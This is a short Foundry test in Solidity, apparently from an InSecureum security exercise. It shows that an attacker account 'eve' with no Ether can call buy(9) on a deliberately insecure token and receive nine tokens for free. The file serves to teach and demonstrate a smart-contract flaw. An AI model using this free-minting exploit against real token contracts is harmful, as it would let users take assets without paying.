pragma solidity 0.7.0;
pragma experimental ABIEncoderV2;

import {Test} from "forge-std/Test.sol";
import {Addresses} from "src/race_01/crytic/utils/Addresses.sol";

// test with:
// forge test --fork-url http://localhost:8545 -vvvvv --match minting
contract InSecureumTokenTest is Test, Addresses {
  function test_minting_tokens_for_free() public {
    // Eve is the attacker
    address eve = makeAddr("eve");
    // Her initial Ether balance is 0
    assertEq(eve.balance, 0);
    // Her initial token balance is 0
    assertEq(token.balances(eve), 0);

    vm.prank(eve);
    // Eve buys 9 tokens
    token.buy(9);

    // Eve's token balance is 9
    assertEq(token.balances(eve), 9);
  }
}
